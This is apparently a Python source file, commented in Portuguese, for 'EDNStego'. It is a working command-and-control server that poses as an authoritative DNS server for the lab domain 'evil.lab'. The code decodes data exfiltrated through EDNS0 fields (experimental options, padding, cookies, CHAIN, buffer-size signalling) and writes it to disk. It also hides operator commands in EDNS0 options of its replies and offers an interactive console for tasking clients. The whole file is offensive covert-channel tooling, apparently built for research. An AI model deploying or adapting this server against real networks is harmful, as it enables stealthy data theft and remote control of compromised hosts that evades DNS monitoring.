#!/usr/bin/env python3
"""
EDNStego Server — Servidor DNS Autoritativo + C2

Atua como servidor DNS para o domínio de teste (evil.lab)
e decodifica dados exfiltrados via campos EDNS0.
"""

import argparse
import logging
import threading
import json
import os
import sys
from datetime import datetime

from scapy.all import IP, UDP, send, sniff, conf
from scapy.layers.dns import DNS, DNSQR, DNSRR, DNSRROPT, EDNS0TLV

sys.path.insert(0, os.path.dirname(__file__))
from techniques import t1_opt_option, t2_padding, t3_cookie
from techniques import t4_bufsize, t5_chain, t6_hybrid


class EDNStegoServer:
    def __init__(self, domain, listen_ip='0.0.0.0', port=53, log_dir='./logs'):
        self.domain = domain
        self.listen_ip = listen_ip
        self.port = port
        self.log_dir = log_dir

        # Estado do C2
        self.pending_commands = {}   # {client_ip: command}
        self.exfil_buffers = {}      # {client_ip: [data_chunks]}
        self.client_states = {}      # {client_ip: state}

        # Decodificadores por técnica
        self.decoders = {
            't1': t1_opt_option.decode_data,
            't2': t2_padding.decode_data,
            't3': t3_cookie.decode_data,
            't4': t4_bufsize.decode_signal,
            't5': t5_chain.decode_data,
            't6': t6_hybrid.decode_data,
        }

        # Setup logging
        os.makedirs(log_dir, exist_ok=True)
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s [%(levelname)s] %(message)s',
            handlers=[
                logging.FileHandler(f'{log_dir}/c2-server.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger('EDNStego')

    def handle_query(self, pkt):
        """Processar query DNS recebida"""
        if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
            return

        qname = pkt[DNSQR].qname.decode().rstrip('.')
        src_ip = pkt[IP].src
        src_port = pkt[UDP].sport

        self.logger.info(f"Query de {src_ip}:{src_port} -> {qname}")

        # Verificar se é para nosso domínio
        if not qname.endswith(self.domain):
            self.logger.debug(f"Ignorando query para domínio externo: {qname}")
            return

        # Registrar cliente
        self.client_states[src_ip] = {
            'last_seen': datetime.now().isoformat(),
            'last_query': qname,
        }

        # Extrair dados EDNS0 se presentes
        extracted_data = self._extract_edns0_data(pkt, src_ip)

        if extracted_data:
            self.logger.info(
                f"[EXFIL] {len(str(extracted_data))} bytes de {src_ip} "
                f"via {extracted_data.get('technique', 'unknown')}"
            )
            self._save_exfiltrated(src_ip, extracted_data)

        # Construir e enviar resposta com comando C2
        resp = self._build_response(pkt, src_ip)
        send(resp, verbose=0)

    def _extract_edns0_data(self, pkt, src_ip):
        """Tentar decodificar dados de todos os campos EDNS0"""
        results = {}

        if not pkt.haslayer(DNSRROPT):
            return None

        opt = pkt[DNSRROPT]

        # Verificar cada opção EDNS0
        if hasattr(opt, 'rdata') and opt.rdata:
            for tlv in opt.rdata:
                optcode = tlv.optcode
                optdata = tlv.optdata

                # T1: Opções experimentais (65001-65534)
                if 65001 <= optcode <= 65534:
                    results['technique'] = 't1'
                    results['data'] = optdata
                    results['optcode'] = optcode

                # T2: Padding (code 12) com dados não-zero
                elif optcode == 12:
                    if any(b != 0 for b in optdata):
                        results['technique'] = 't2'
                        results['data'] = optdata

                # T3: Cookie (code 10)
                elif optcode == 10:
                    if len(optdata) > 8:
                        results['technique'] = 't3'
                        results['client_cookie'] = optdata[:8]
                        results['server_cookie_data'] = optdata[8:]

                # T5: CHAIN (code 13)
                elif optcode == 13:
                    if len(optdata) >= 2:
                        results['technique'] = 't5'
                        results['fragment_index'] = optdata[0]
                        results['fragment_total'] = optdata[1]
                        results['data'] = optdata[2:]

        # T4: Buffer size signaling
        buf_size = opt.rclass if hasattr(opt, 'rclass') else 0
        if buf_size not in [512, 1232, 4096]:  # Valores anômalos
            results.setdefault('technique', 't4')
            results['buffer_signal'] = buf_size
            signal = t4_bufsize.decode_signal(buf_size)
            results['signal_decoded'] = signal

        return results if results else None

    def _build_response(self, pkt, client_ip):
        """Construir resposta DNS com dados C2 em EDNS0"""
        qname = pkt[DNSQR].qname

        # Resposta A record básica
        resp_ip = "10.0.3.100"

        # Construir opções EDNS0 de resposta com comando C2
        edns_opts = []

        # Se há comando pendente para este cliente
        cmd = self.pending_commands.pop(client_ip, None)
        if cmd:
            cmd_bytes = cmd.encode()
            edns_opts.append(
                EDNS0TLV(optcode=65001,
                         optlen=len(cmd_bytes),
                         optdata=cmd_bytes)
            )

        # Construir resposta
        resp = (
            IP(dst=pkt[IP].src, src=pkt[IP].dst) /
            UDP(dport=pkt[UDP].sport, sport=53) /
            DNS(
                id=pkt[DNS].id,
                qr=1, aa=1, rd=1, ra=1,
                qd=pkt[DNSQR],
                an=DNSRR(rrname=qname, type='A',
                         rdata=resp_ip, ttl=60),
                ar=DNSRROPT(rclass=4096, rdata=edns_opts)
            )
        )

        return resp

    def _save_exfiltrated(self, src_ip, data):
        """Salvar dados exfiltrados em arquivo"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
        technique = data.get('technique', 'unknown')

        filename = f"{self.log_dir}/exfil_{src_ip}_{technique}_{timestamp}.json"

        # Converter bytes para hex para serialização JSON
        serializable = {}
        for k, v in data.items():
            if isinstance(v, bytes):
                serializable[k] = v.hex()
            else:
                serializable[k] = v

        with open(filename, 'w') as f:
            json.dump(serializable, f, indent=2)

    def set_command(self, client_ip, command):
        """Definir comando C2 para um cliente"""
        self.pending_commands[client_ip] = command
        self.logger.info(f"Comando enfileirado para {client_ip}: {command}")

    def start(self):
        """Iniciar servidor"""
        self.logger.info(f"EDNStego Server v1.0")
        self.logger.info(f"Listening on {self.listen_ip}:{self.port}")
        self.logger.info(f"Authoritative for: {self.domain}")
        self.logger.info(f"Logs: {self.log_dir}")
        self.logger.info("Aguardando queries...")

        # Iniciar thread para console C2
        console = threading.Thread(target=self._c2_console, daemon=True)
        console.start()

        # Sniff DNS
        sniff(
            filter=f'udp port {self.port}',
            prn=self.handle_query,
            store=0,
            iface=conf.iface
        )

    def _c2_console(self):
        """Console interativo para enviar comandos C2"""
        while True:
            try:
                cmd = input("\n[C2]> ")
                if cmd.startswith("cmd "):
                    parts = cmd.split(" ", 2)
                    if len(parts) == 3:
                        self.set_command(parts[1], parts[2])
                    else:
                        print("Uso: cmd <client_ip> <command>")
                elif cmd == "clients":
                    if not self.client_states:
                        print("  Nenhum cliente conectado")
                    for ip, state in self.client_states.items():
                        print(f"  {ip}: {state}")
                elif cmd == "help":
                    print("Comandos:")
                    print("  cmd <ip> <command>  - Enviar comando C2")
                    print("  clients             - Listar clientes ativos")
                    print("  help                - Esta ajuda")
                    print("  exit                - Encerrar servidor")
                elif cmd == "exit":
                    break
            except (EOFError, KeyboardInterrupt):
                break


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='EDNStego C2 Server')
    parser.add_argument('--domain', default='evil.lab',
                        help='Domínio autoritativo')
    parser.add_argument('--listen', default='0.0.0.0',
                        help='IP para escutar')
    parser.add_argument('--port', type=int, default=53,
                        help='Porta DNS')
    parser.add_argument('--log-dir', default='./logs',
                        help='Diretório de logs')

    args = parser.parse_args()

    server = EDNStegoServer(
        domain=args.domain,
        listen_ip=args.listen,
        port=args.port,
        log_dir=args.log_dir
    )
    server.start()
